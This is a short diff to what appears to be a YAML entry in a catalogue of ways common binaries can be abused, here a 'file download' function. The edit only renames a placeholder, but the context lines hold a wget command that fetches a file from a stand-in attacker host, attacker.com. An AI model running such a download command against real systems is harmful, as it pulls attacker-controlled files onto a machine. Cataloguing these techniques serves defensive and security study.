@@ -10,6 +10,6 @@ functions:
     - description: Fetch a remote file via HTTP GET request.
       code: |
         export URL=http://attacker.com/file_to_get
-        export LFILE=where_to_save
+        export LFILE=file_to_save
         wget $URL -O $LFILE
 ---
